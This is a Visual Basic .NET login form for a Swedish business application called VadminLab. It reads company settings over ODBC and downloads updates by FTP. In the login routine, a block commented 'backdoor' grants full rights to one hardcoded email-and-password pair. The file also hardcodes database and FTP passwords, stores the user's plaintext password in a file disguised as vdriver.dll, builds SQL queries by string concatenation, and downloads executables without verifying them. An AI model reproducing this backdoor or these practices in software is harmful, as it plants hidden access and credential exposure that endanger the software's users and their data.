
Imports System
Imports System.IO
Imports System.Data.Odbc
Imports System.Configuration
Imports System.Net
Imports System.Text.RegularExpressions

Public Class Foretag
    Dim Labversion As String = "", pityp As String
    Private Sub Foretag_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        vernr = "20260108a"
        Prognamn = "VadminLab2026"
        Dim rect As Rectangle = Screen.PrimaryScreen.WorkingArea
        sokvag = AppDomain.CurrentDomain.BaseDirectory
        Me.Top = (rect.Height / 2) - (Me.Height / 2)
        Me.Left = (rect.Width / 2) - (Me.Width / 2)
        readdll()

        If spar = "True" Then SparaCB.Checked = True
        SparaCB.Refresh()
        KlientIdTB.Text = KlientID

        If KlientID = "NM" Or KlientID = "MD" Or KlientID = "MC" Then PITyp = "New"


        PersonligIDL.Visible = True
            PersonligIDTB.Visible = True
            PersonligIDTB.Text = PersonligID

            LosenTB.Text = losen

        If spar = "=True" Then
            SparaCB.Checked = True
            SparaCB.Refresh()
        End If

        My.Computer.FileSystem.WriteAllText(sokvag + "LABVersion.cfg", "LABversion=" + vernr + Space(40) + vbCrLf, False)

        myip = "90.231.192.137"

        Ver.Text = "Version: " + vernr
        Huvud.Text = Prognamn + " - Behörighetskontroll"
        today = Format(Now, "yyyy-MM-dd")
        odbclosen = "alfons"
        datum.Text = today

    End Sub
    Private Sub Loginrutin()
        Me.Cursor = Cursors.WaitCursor
        ReadClientfil(sokvag + KlientID + ".cfg")

        If spar = "True" Then
            SparaCB.Checked = True
            SparaCB.Refresh()
        Else
            SparaCB.Checked = False
        End If

        HamtaForetagNy(KlientID)
        GetNewBehorighet(PersonligIDTB.Text)
        sakerhet = 1
            skrivatillvdriver()
        SkrivaLoginLogg(KlientID, "Lab")
        'hanterar dll filen
        If SparaCB.Checked = True Then
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "ClientID=" + KlientID + vbCrLf, False)
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Lösen=" + losen + vbCrLf, True)
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "PersID=" + PersonligIDTB.Text + vbCrLf, True)
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Spara=" + CStr(SparaCB.Checked) + vbCrLf, True)
        Else
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "" + vbCrLf, False)
            End If

        ''backdoor
        If PersonligIDTB.Text = "edgar.massey@gmail.com" And losen = "EMassey46" Then
            MaxBehorighet = True : Userpassword = losen
        End If

        ' Password check
        If LosenTB.Text <> Userpassword Then
            MessageBox.Show("Fel lösenord")
            Exit Sub
        End If

        ' Authorization check
        If Not (MaxBehorighet Or TotLab) Then
            MessageBox.Show("Ingen behörighet för VadminLab")
            Exit Sub
        End If

        ' ---- Approved ----
        Dim checkver = Hamptaversion("VadminLAB")
        'checkver = "20251228"
        If checkver > vernr Then
            Dim result As DialogResult =
        MessageBox.Show("Ny version av VadminLab finns att ladda ner från vadmin.net", "Uppdatering", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.Yes Then
                StartUpdateAndExit()
                Exit Sub
            End If
        End If
        LabstartF.Show()

        Me.Close()

        Me.Cursor = Cursors.Arrow
    End Sub



    Private Sub AvslutaK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AvslutaK.Click
        Me.Close()
    End Sub

    Private Sub KlientIdTB_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles KlientIdTB.KeyUp


        PersonligIDL.Visible = True
        PersonligIDTB.Visible = True
        PersonligIDTB.Text = PersonligID


        If e.KeyCode = Keys.Enter Then
            Loginrutin()
        End If
    End Sub

    Private Sub KlientIdTB_LostFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles KlientIdTB.LostFocus
        KlientID = UCase(KlientIdTB.Text)
        KlientIdTB.Text = UCase(KlientIdTB.Text)
    End Sub
    Private Sub LoginK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LoginK.Click

        Loginrutin()
    End Sub

    Private Function HamtaForetagNy(ByVal klientId As String) As Boolean
        Dim connStr1 As String =
        "DSN=" & odbcsource & ";Database=" & databasnamn & ";Uid=v2000;Pwd=" & odbclosen

        Try
            Using cn1 As New OdbcConnection(connStr1)
                cn1.Open()

                Dim sql As String = "SELECT * FROM foretagreg WHERE ClientID = ?"
                Using cmd As New OdbcCommand(sql, cn1)
                    cmd.Parameters.Add("?", OdbcType.VarChar).Value = klientId

                    Using tabel As OdbcDataReader = cmd.ExecuteReader()
                        If Not tabel.Read() Then
                            MessageBox.Show("Ingen rad hittades för ClientID " & klientId)
                            Return False
                        End If

                        ' --- FIELD ASSIGNMENTS ---


                        rakenskapID = nullhantering(tabel("yearid"), "S")
                        logonamn = nullhantering(tabel("Logonamn"), "S")
                        Firmanamn = nullhantering(tabel("Firmanamn"), "S")
                        Postadress1 = nullhantering(tabel("Postadress1"), "S")
                        Postadress2 = nullhantering(tabel("Postadress2"), "S")
                        Postadress3 = nullhantering(tabel("Postadress3"), "S")
                        besad1 = nullhantering(tabel("besoksadress1"), "S")
                        besad2 = nullhantering(tabel("besoksadress2"), "S")
                        firmaland = nullhantering(tabel("Land"), "S")
                        telefon = nullhantering(tabel("Telefon"), "S")
                        telefax = nullhantering(tabel("Telefax"), "S")
                        gsm = nullhantering(tabel("GSM"), "S")
                        epost = nullhantering(tabel("epost"), "S")
                        kontaktperson = nullhantering(tabel("kontaktperson"), "S")
                        password1 = nullhantering(tabel("Password1"), "S")
                        password2 = nullhantering(tabel("Password2"), "S")
                        password3 = nullhantering(tabel("Password3"), "S")
                        password4 = nullhantering(tabel("Password4"), "S")
                        password5 = nullhantering(tabel("Password5"), "S")
                        password6 = nullhantering(tabel("Password6"), "S")
                        antkvitto = nullhantering(tabel("Antalkvitto"), "T")
                        antalfolj = nullhantering(tabel("Antalfoljesedel"), "T")
                        antfakt = nullhantering(tabel("Antalfaktura"), "T")
                        antorderbekraft = nullhantering(tabel("Antalorderbekraft"), "T")
                        antallonespec = nullhantering(tabel("Antallonespec"), "T")
                        grundlista = nullhantering(tabel("Grundlista"), "T")
                        specialversion = nullhantering(tabel("Specialversion"), "S")

                        moms1 = nullhantering(tabel("moms1"), "T")
                        moms2 = nullhantering(tabel("moms2"), "T")
                        moms3 = nullhantering(tabel("moms3"), "T")

                        ' --- MOMS CALCULATION (safe) ---
                        If moms1 <> 0D Then
                            momsv(1) = moms1 / 100D
                            momsv(4) = Int(moms1 / ((moms1 / 100D) + 1D) * 100D) / 100D / 100D
                        Else
                            momsv(1) = 0D : momsv(4) = 0D
                        End If

                        If moms2 <> 0D Then
                            momsv(2) = moms2 / 100D
                            momsv(5) = Int(moms2 / ((moms2 / 100D) + 1D) * 100D) / 100D / 100D
                        Else
                            momsv(2) = 0D : momsv(5) = 0D
                        End If

                        If moms3 <> 0D Then
                            momsv(3) = moms3 / 100D
                            momsv(6) = Int(moms3 / ((moms3 / 100D) + 1D) * 100D) / 100D / 100D
                        Else
                            momsv(3) = 0D : momsv(6) = 0D
                        End If

                        drojsmalsranta = nullhantering(tabel("drojsmalsranta"), "T")
                        fortrycktpapper = nullhantering(tabel("Fortryckbankgiro"), "T")
                        fortrycktfot = nullhantering(tabel("Fortrycktfot"), "T")
                        bankgiro = nullhantering(tabel("bankgiro"), "S")
                        postgiro = nullhantering(tabel("postgiro"), "S")
                        regnr = nullhantering(tabel("regnr"), "S")
                        bankkonto = nullhantering(tabel("bank"), "S")
                        bankkonteringsnr = nullhantering(tabel("bankkonteringsnr"), "S")
                        If Len(bankkonteringsnr) < 4 Then bankkonteringsnr = "1940"

                        stdforsaljning = nullhantering(tabel("stdforsaljning"), "S")
                        utmoms = nullhantering(tabel("utmoms"), "S")
                        lagerup = nullhantering(tabel("Lagerup"), "S")
                        telebankgiro = nullhantering(tabel("telebankgiro"), "T")
                        expavgift = nullhantering(tabel("Expavgift"), "T")
                        avgiftsgrans = nullhantering(tabel("avgiftsgrans"), "T")
                        ettlangd = nullhantering(tabel("Ettikettlangd"), "T")
                        ettbred = nullhantering(tabel("Ettantalibred"), "T")
                        komponentup = nullhantering(tabel("Girolink"), "T")
                        komment1 = nullhantering(tabel("Komment1"), "S")
                        komment2 = nullhantering(tabel("Komment2"), "S")
                        sidolev = nullhantering(tabel("Sidolev"), "T")
                        genast = nullhantering(tabel("Telebankgiro"), "T") ' (verify if intended)
                        EAN = nullhantering(tabel("Inteean"), "T")
                        Language = nullhantering(tabel("sprak"), "S")
                        faktfolj = nullhantering(tabel("faktfolj"), "T")
                        girolinknr = nullhantering(tabel("girolinknr"), "S")
                        girolinkfil = nullhantering(tabel("girolinkfil"), "S")
                        rabradfakt = nullhantering(tabel("rabradfakt"), "S")
                        arbavgift = nullhantering(tabel("arbavgift"), "T")
                        ejprissatt = nullhantering(tabel("ejprisspar"), "T")
                        nolllagerspar = nullhantering(tabel("nolllagerspar"), "T")
                        a5kvitto = nullhantering(tabel("a5kvitto"), "T")
                        rantdagar = nullhantering(tabel("rantdagar"), "T")
                        rantbelopp = nullhantering(tabel("rantbelopp"), "T")
                        BasEU97 = nullhantering(tabel("baseu97"), "T")
                        ejavrund = nullhantering(tabel("ejavrundning"), "T")
                        ordsok = nullhantering(tabel("sokorder"), "T")
                        ejcapri = nullhantering(tabel("ejcapris"), "T")
                        lagerred = nullhantering(tabel("lagerred"), "T")
                        garantitext = nullhantering(tabel("garantitext"), "S")
                        textradpos = nullhantering(tabel("textrad"), "T")
                        orderformat = nullhantering(tabel("orderformat"), "S")
                        meddelande = nullhantering(tabel("meddelande"), "S")
                        SMTPservernamn = nullhantering(tabel("SMTPserver"), "S")
                        SMTPUser = nullhantering(tabel("SMTPUser"), "S")
                        SMTPPassW = nullhantering(tabel("SMTPPassW"), "S")
                        banknamn = nullhantering(tabel("banknamn"), "S")
                        webadress = nullhantering(tabel("webadress"), "S")
                        ingmoms = nullhantering(tabel("ingmomskonto"), "S")
                        kp = nullhantering(tabel("kostnpos"), "T")
                    End Using
                End Using
            End Using

            Return True

        Catch ex As Exception
            MessageBox.Show("Fel vid ODBC-anrop: " & ex.Message)
            Return False
        End Try
    End Function

    Private Sub LosenTB_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles LosenTB.KeyUp
        If e.KeyCode = Keys.Enter Then
            loginrutin()
        End If
    End Sub
    Private Sub LosenTB_LostFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles LosenTB.LostFocus
        losen = LosenTB.Text
    End Sub

    Private Sub SparaCB_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SparaCB.CheckedChanged
        spar = SparaCB.Checked
    End Sub

    Private Sub KlientIdTB_TextChanged(sender As Object, e As EventArgs) Handles KlientIdTB.TextChanged
        KlientID = UCase(KlientIdTB.Text)
        'KlientIdTB.Text = UCase(KlientIdTB.Text)
        If PITyp = "Yes" Then
            PersonligIDL.Visible = True
            PersonligIDTB.Visible = True
        Else
            PersonligIDL.Visible = False
            PersonligIDTB.Visible = False
        End If

    End Sub

    Private Sub LosenTB_TextChanged(sender As Object, e As EventArgs) Handles LosenTB.TextChanged
        losen = LosenTB.Text
    End Sub
    Function Hamptaversion(ByVal kod As String)
        Dim odbcs As String = "VadminODBC", odbcl As String = "alfons"
        Hamptaversion = ""
        Dim cn As OdbcConnection, mySQL As String
        Dim connStr As String, l As Integer
        connStr = "DSN=" + odbcs + "; Database=SiteInfo" + ";Uid=v2000;Pwd=" + odbcl
        cn = New OdbcConnection(connStr)
        cn.Open()
        mySQL = "SELECT * FROM ProgramVersionReg"
        mySQL = mySQL + " WHERE "
        mySQL = mySQL + " Programnamn = '" + kod + "'  "
        ' Stop

        Dim myCmd As New OdbcCommand(mySQL, cn)
        Dim tabel As OdbcDataReader = myCmd.ExecuteReader(CommandBehavior.CloseConnection)
        'myCmd.ExecuteNonQuery()
        l = 1
        If tabel.HasRows = False Then
            GoTo slut
        Else
            While tabel.Read()

                Hamptaversion = tabel("AktuellVersion")
                l = l + 1
            End While

        End If
slut:
        cn.Close()
    End Function

    Sub Uppdateramenyprogram()
        On Error Resume Next
        Dim rfn As String, lfn As String
        Dim Message As String = "Vill du verkligen uppdatera VadminMeny programet ?"
        Dim Caption As String = "OBS:Se till att inte programet körs!!"
        Dim Buttons As MessageBoxButtons = MessageBoxButtons.OKCancel
        Dim Result As DialogResult

        ' Result = MessageBox.Show(Message, Caption, Buttons)

        rfn = "ftp://ftp.vadmin.net/vadmin.net/downloads/VadminMeny.exe"
        lfn = sokvag + "\VadminMeny.exe"
        Dim ftp As FtpWebRequest = CType(FtpWebRequest.Create(rfn), FtpWebRequest)
        Console.WriteLine("Downloading: " & rfn)
        ftp.Credentials = New NetworkCredential("Edgar", "alfons")
        ftp.KeepAlive = False
        ftp.UseBinary = True
        ftp.Method = WebRequestMethods.Ftp.DownloadFile
        Using FtpResponse As FtpWebResponse = CType(ftp.GetResponse, FtpWebResponse)
            Using ResponseStream As IO.Stream = FtpResponse.GetResponseStream
                Using fs As New IO.FileStream(lfn, FileMode.Create)
                    Dim buffer(2047) As Byte
                    Dim read As Integer = 0
                    Do
                        read = ResponseStream.Read(buffer, 0, buffer.Length)
                        fs.Write(buffer, 0, read)
                        Console.Write(".")
                    Loop Until read = 0
                    ResponseStream.Close()
                    fs.Flush()
                    fs.Close()
                End Using
                ResponseStream.Close()
            End Using
        End Using
        MessageBox.Show("Meny uppdateringen utfört!")

    End Sub
    Function SkrivaLoginLogg(AnvID As String, AnvNamn As String)
        On Error Resume Next
        tid = DateTime.Now.ToString("HH:mm:ss")
        'hostip
        Dim iphostadress As String
        Dim lol As WebClient = New WebClient()
        Dim str As String = lol.DownloadString("http://www.themasseys.net/ip.asp")
        Dim pattern As String = "<h3>Your IP number is:(.+)</h3>"
        Dim ipad As String
        Dim matches1 As MatchCollection = Regex.Matches(str, pattern)
        Dim ip As String = matches1(0).ToString
        ip = ip.Remove(0, 22)
        ip = ip.Replace("</h3>", "")
        ip = ip.Replace(" ", "")
        ipad = ip
        iphostadress = ipad
        'localip
        ipadress = getlocalIP()
        Dim cn As OdbcConnection, mySQL As String
        Dim connStr As String, falt As String, varden As String
        connStr = "DSN=" + odbcsource + "; Database=" + databasnamn + ";Uid=v2000;Pwd=" + odbclosen
        cn = New OdbcConnection(connStr)
        cn.Open()
        falt = "" : varden = ""
        mySQL = "INSERT INTO LogonLoggen "
        falt = falt + "MyTimeStamp,"
        varden = varden + "'" + gettimestamp() + "',"
        falt = falt + "Datum,"
        varden = varden + "'" + today + "',"
        falt = falt + "Tid,"
        varden = varden + "'" + tid + "',"
        falt = falt + "HostIP,"
        varden = varden + "'" + iphostadress + "',"
        falt = falt + "LokalIP,"
        varden = varden + "'" + ipadress + "',"
        falt = falt + "AnvID,"
        varden = varden + "'" + AnvID + " " + PersonligID + "',"
        falt = falt + "AnvNamn "
        varden = varden + "'" + AnvNamn + " " + vernr + "'"
        mySQL = mySQL & "(" & falt & ") VALUES (" & varden & ");"
        Dim myCmd = New OdbcCommand(mySQL, cn)
        If iphostadress <> myip Then
            myCmd.ExecuteNonQuery()
        End If
        cn.Close()
        SkrivaLoginLogg = "Ja"
    End Function

    Function GetlocalIP()
        Dim strHostName As String
        Dim IPAddresses As IPAddress()
        GetlocalIP = ""
        strHostName = System.Net.Dns.GetHostName()
        IPAddresses = System.Net.Dns.GetHostEntry(strHostName).AddressList
        For Each IP As IPAddress In IPAddresses
            If InStr(IP.ToString, ".") > 1 Then
                GetlocalIP = IP.ToString
            End If
        Next
    End Function

    Function HamptapersonligID(ByVal clientid As String)
        HamptapersonligID = ""

        On Error GoTo nocon
        Dim cn As OdbcConnection, mySQL As String
        Dim connStr As String, test As Decimal = 0
        connStr = "DSN=" + odbcsource + "; Database=" + databasnamn + ";Uid=v2000;Pwd=" + odbclosen
        cn = New OdbcConnection(connStr)
        cn.Open()
        mySQL = "SELECT * FROM Behorighetsreg"
        mySQL = mySQL + " WHERE UserID = '" + PersonligIDTB.Text + "' "
        Dim myCmd As New OdbcCommand(mySQL, cn)
        Dim tabel As OdbcDataReader = myCmd.ExecuteReader(CommandBehavior.CloseConnection)
        'myCmd.ExecuteReader()
        While tabel.Read()
            PersonligID = nullhantering(tabel("UserID"), "S")
            PersonligKlarTextName = nullhantering(tabel("Klartextnamn"), "S")
            PersonligIDLosen = nullhantering(tabel("Password"), "S")
            PersonligIDKlass = nullhantering(tabel("Behörighetsklass"), "S")
            If PersonligIDLosen = LosenTB.Text Then
                HamptapersonligID = PersonligKlarTextName
            End If

        End While
        cn.Close()
nocon:
        If Err.Number <> 0 Then
            MessageBox.Show("ODBC förbindelse saknas")
        End If

    End Function

    Private Sub Huvud_Click(sender As Object, e As EventArgs) Handles Huvud.Click
        LokalInstF.Show()
        LokalInstF.BringToFront()
    End Sub
    Sub skrivatillvdriver()
        If SparaCB.Checked = True Then
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "ClientID=" + KlientID + vbCrLf, False)
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Lösen=" + losen + vbCrLf, True)
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "PersID=" + PersonligIDTB.Text + vbCrLf, True)
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Spara=" + CStr(SparaCB.Checked) + vbCrLf, True)
        Else
            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "" + vbCrLf, False)

        End If
    End Sub
    Function ReadClientfil(fil As String)
        For Each line As String In System.IO.File.ReadLines(fil)
            Console.WriteLine(line)
            If Strings.Left$(line, 11) = "MenyVersion" Then menuversion = BLANKBORT(Mid$(line, 13, 50))
            If Strings.Left$(line, 7) = "Invoice" Then invoicepr = BLANKBORT(Mid$(line, 9, 50))
            If Strings.Left$(line, 8) = "Standard" Then standardpr = BLANKBORT(Mid$(line, 10, 50))
            If Strings.Left$(line, 4) = "Pack" Then packpr = BLANKBORT(Mid$(line, 6, 50))
            If Strings.Left$(line, 8) = "Delivery" Then deliverypr = BLANKBORT(Mid$(line, 10, 50))
            If Strings.Left$(line, 4) = "Bill" Then billpr = BLANKBORT(Mid$(line, 6, 50))
            If Strings.Left$(line, 3) = "PDF" Then pdfpr = BLANKBORT(Mid$(line, 5, 50))
            If Strings.Left$(line, 7) = "PostPak" Then postpr = BLANKBORT(Mid$(line, 9, 50))
            If Strings.Left$(line, 8) = "Reminder" Then paminpr = BLANKBORT(Mid$(line, 10, 50))
            If Strings.Left$(line, 8) = "Wagespec" Then lonbeskpr = BLANKBORT(Mid$(line, 10, 50))
            If Strings.Left$(line, 7) = "Telefax" Then telefaxpr = BLANKBORT(Mid$(line, 9, 50))
            If Strings.Left$(line, 7) = "Bestskr" Then bestpr = BLANKBORT(Mid$(line, 9, 50))
            If Strings.Left$(line, 8) = "Timecard" Then timecardpr = BLANKBORT(Mid$(line, 10, 50))
            If Strings.Left$(line, 10) = "DefaultRef" Then defaultref = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, 10) = "DefaultDoc" Then defaultDoc = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, 11) = "StationType" Then stationtype = BLANKBORT(Mid$(line, 13, 50))
            If Strings.Left$(line, 8) = "Calender" Then calbok = BLANKBORT(Mid$(line, 10, 20))
            If Strings.Left$(line, 10) = "Kvittorems" Then kvittorems = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, 9) = "Startutsk" Then startutsk = BLANKBORT(Mid$(line, 11, 50))
            If Strings.Left$(line, 10) = "Fraktsedel" Then fraktsedpr = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, 11) = "Kolliadress" Then kolliadrpr = BLANKBORT(Mid$(line, 13, 50))
            If Strings.Left$(line, 10) = "Farliggods" Then farliggodspr = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, 7) = "Stdmoms" Then stdmoms = BLANKBORT(Mid$(line, 9, 1))
            If Strings.Left$(line, 12) = "Databasename" Then databasnamn = BLANKBORT(Mid$(line, 14, 50))
            If Strings.Left$(line, 11) = "KundDokMapp" Then kunddokmapp = BLANKBORT(Mid$(line, 13, 50))
            If Strings.Left$(line, 10) = "LevDokMapp" Then levdokmapp = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, 6) = "Offert" Then offertpr = BLANKBORT(Mid$(line, 8, 50))
            If Strings.Left$(line, 10) = "ODBCSource" Then odbcsource = BLANKBORT(Mid$(line, 12, 50))
            odbcsourcer = odbcsource
            If Strings.Left$(line, 10) = "StationsID" Then stationsid = BLANKBORT(Mid$(line, 12, 50))
            If Strings.Left$(line, Len("ClientID")) = "ClientID" Then KlientID = BLANKBORT(Mid$(line, Len("ClientID") + 2, 50))
            If Strings.Left$(line, 2) = "Lö" Then losen = BLANKBORT(Mid$(line, Len("Lösen") + 2, 50))
            If Strings.Left$(line, 6) = "PersID" Then PersonligID = BLANKBORT(Mid$(line, Len("PersID") + 2, 50))
            If Strings.Left$(line, Len("Tid")) = "Tid" Then tid = BLANKBORT(Mid$(line, Len("Tid") + 2, 20))
            If Strings.Left$(line, Len("Spar")) = "Spar" Then spar = BLANKBORT(Mid$(line, Len("Spar") + 3, 4))
        Next
        ReadClientfil = "1"
    End Function
    Function readdll()
        For Each line As String In System.IO.File.ReadLines(sokvag + "vdriver.dll")
            ' Console.WriteLine(line)
            If Strings.Left$(line, Len("ClientID")) = "ClientID" Then KlientID = BLANKBORT(Mid$(line, Len("ClientID") + 2, 50))
            If Strings.Left$(line, 5) = "Lösen" Then losen = BLANKBORT(Mid$(line, Len("Lösen") + 2, 50))
            If Strings.Left$(line, 6) = "PersID" Then PersonligID = BLANKBORT(Mid$(line, Len("PersID") + 2, 50))
            If Strings.Left$(line, Len("Spar")) = "Spar" Then spar = BLANKBORT(Mid$(line, Len("Spar") + 3, 4))
        Next
        readdll = ""

    End Function
    Function LasVersion(fil As String)
        For Each line As String In System.IO.File.ReadLines(fil)
            ' Console.WriteLine(line)
            If Strings.Left$(line, 10) = "Labversion" Then Labversion = BLANKBORT(Mid$(line, 12, 50))
        Next
        LasVersion = ""
    End Function


    Function LasMenyVersion()
        For Each line As String In System.IO.File.ReadLines("MenyInfo.cfg")
            ' Console.WriteLine(line)
            If Strings.Left$(line, 11) = "MenyVersion" Then menuversion = BLANKBORT(Mid$(line, 13, 50))
            LasMenyVersion = ""
        Next
        LasMenyVersion = ""

    End Function
    Function GetNewBehorighet(ByVal kod As String) As String
        Dim result As String = ""

        Dim connStr As String = "DSN=" & odbcsource &
                            "; Database=" & databasnamn &
                            ";Uid=v2000;Pwd=" & odbclosen

        Using cn As New OdbcConnection(connStr)
            cn.Open()

            Dim mySQL As String = "SELECT * FROM BehorReg WHERE UserId = ?"

            Using myCmd As New OdbcCommand(mySQL, cn)
                myCmd.Parameters.Add("@UserId", OdbcType.VarChar).Value = kod

                Using tabel As OdbcDataReader = myCmd.ExecuteReader()
                    If Not tabel.HasRows Then
                        ' Inga rader → sätt alla rättigheter till False
                        MaxBehorighet = False
                        TotCal = False
                        TotLab = False
                        TotRec = False
                        TotRed = False
                        TotOLF = False
                        MOLFKundreg = False
                        MOLFKundres = False
                        MOLFProdreg = False
                        MOLFOrderFakt = False
                        MOLFArbOrder = False
                        MOLFInlev = False
                        MOLFBestall = False
                        BRECBegrOmtappning = False
                        BOLFBegProdpriser = False
                        BOLFAnkomnstKontroll = False
                        BCalEndastVisning = False
                    ElseIf tabel.Read() Then
                        ' Förutsatt 1 rad per användare
                        UserID = nullhantering(tabel("UserID"), "S")
                        UserNamn = nullhantering(tabel("Usernamn"), "S")
                        Userpassword = nullhantering(tabel("UserPassword"), "S")

                        ' Se till att dessa är Boolean i din kod
                        MaxBehorighet = CBool(tabel("MaxBehorighet"))
                        TotCal = CBool(tabel("TotCal"))
                        TotLab = CBool(tabel("TotLab"))
                        TotRec = CBool(tabel("TotRec"))
                        TotRed = CBool(tabel("TotRed"))
                        TotOLF = CBool(tabel("TotOlf"))

                        MOLFKundreg = CBool(tabel("MOLFKundreg"))
                        MOLFKundres = CBool(tabel("MOLFKundres"))
                        MOLFProdreg = CBool(tabel("MOLFProdreg"))
                        MOLFOrderFakt = CBool(tabel("MOLFOrderFakt"))
                        MOLFArbOrder = CBool(tabel("MOLFArbOrder"))
                        MOLFInlev = CBool(tabel("MOLFInlev"))
                        MOLFBestall = CBool(tabel("MOLFBestall"))

                        BRECBegrOmtappning = CBool(tabel("BRECBegrOmtappning"))
                        BOLFBegProdpriser = CBool(tabel("BOLFBegProdpriser"))
                        BOLFAnkomnstKontroll = CBool(tabel("BOLFAnkomnstKontroll"))
                        BCalEndastVisning = CBool(tabel("BCalEndastVisning"))

                        result = "Ja"
                    End If
                End Using
            End Using
        End Using

        Return result
    End Function

    Sub StartUpdateAndExit()
        My.Computer.FileSystem.WriteAllText(sokvag + "Updatefile.txt", "VadminLab" + vbCrLf, False)
        GetProgram("VadminLab")
        Dim baseDir As String = AppDomain.CurrentDomain.BaseDirectory
        Dim updaterExe As String = Path.Combine(baseDir, "VadminUpdater.exe")

        If Not File.Exists(updaterExe) Then
            MessageBox.Show("Updater not found:" & vbCrLf & updaterExe)
            Return
        End If

        ' Start updater
        Process.Start(New ProcessStartInfo() With {
            .FileName = updaterExe,
            .UseShellExecute = False
        })

        ' IMPORTANT: exit immediately so files can be replaced
        Application.Exit()

    End Sub

    Private Sub PersonligIDTB_TextChanged(sender As Object, e As EventArgs) Handles PersonligIDTB.TextChanged
        PersonligID = PersonligIDTB.Text

    End Sub

    Private Sub VisaLosenCB_CheckedChanged(sender As Object, e As EventArgs) Handles VisaLosenCB.CheckedChanged
        If VisaLosenCB.Checked = True Then
            LosenTB.PasswordChar = ControlChars.NullChar
        Else
            LosenTB.PasswordChar = "*"c

        End If
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs)
        HamtaForetagNy(KlientID)
    End Sub

    Function GetProgram(Prognamn As String)
        Dim rfn As String, lfn As String
        On Error GoTo slut
        Dim ftplosen = "alfons"
        rfn = "ftp://ftp.vadmin.net/vadmin.net/downloads/" + Prognamn + ".exe"
        lfn = sokvag + "\" + Prognamn + "Temp.exe"
        Dim ftp As FtpWebRequest = CType(FtpWebRequest.Create(rfn), FtpWebRequest)
        Console.WriteLine("Downloading: " & rfn)
        ftp.Credentials = New NetworkCredential("Edgar", ftplosen)
        ftp.KeepAlive = False
        ftp.UseBinary = True
        ftp.Method = WebRequestMethods.Ftp.DownloadFile
        Using FtpResponse As FtpWebResponse = CType(ftp.GetResponse, FtpWebResponse)
            Using ResponseStream As IO.Stream = FtpResponse.GetResponseStream
                Using fs As New IO.FileStream(lfn, FileMode.Create)
                    Dim buffer(2047) As Byte
                    Dim read As Integer = 0
                    Do
                        read = ResponseStream.Read(buffer, 0, buffer.Length)
                        fs.Write(buffer, 0, read)
                        Console.Write(".")
                    Loop Until read = 0
                    ResponseStream.Close()
                    fs.Flush()
                    fs.Close()
                End Using
                ResponseStream.Close()
            End Using
        End Using

slut:
        GetProgram = "Ja"
    End Function

End Class
